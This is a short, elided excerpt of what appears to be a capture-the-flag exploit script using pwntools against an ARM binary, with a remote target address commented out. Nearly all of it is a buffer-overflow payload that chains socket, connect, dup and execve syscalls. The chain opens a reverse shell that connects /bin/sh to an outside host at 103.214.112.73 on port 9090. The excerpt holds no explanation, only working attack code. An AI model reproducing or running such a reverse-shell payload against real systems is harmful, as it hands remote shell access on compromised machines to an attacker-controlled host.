...
r = process(["qemu-arm-static", "./main"])
#r = remote("34.125.56.151", 2222)
r.recvline(0)
...
payload = b"A" * 0x24
payload += write_str(elf.bss()+0x100, b"\x02\x00#\x82\xa8w?,")
payload += write_str(elf.bss()+0x200, b"/bin/sh\x00")
payload += syscall(2, 1, 0, r7=0x119) # socket(AF_INET, SOCK_STREAM, 0)
payload += syscall(0, elf.bss()+0x100, 0x10, r7=0x11b) # connect("103.214.112.73", 9090)
payload += syscall(0, 0, 0, r7=0x29) # dup(0)
payload += syscall(0, 0, 0, r7=0x29) # dup(0)
payload += syscall(elf.bss()+0x200, 0, 0, r7=0xb) # execve("/bin/sh", 0, 0)
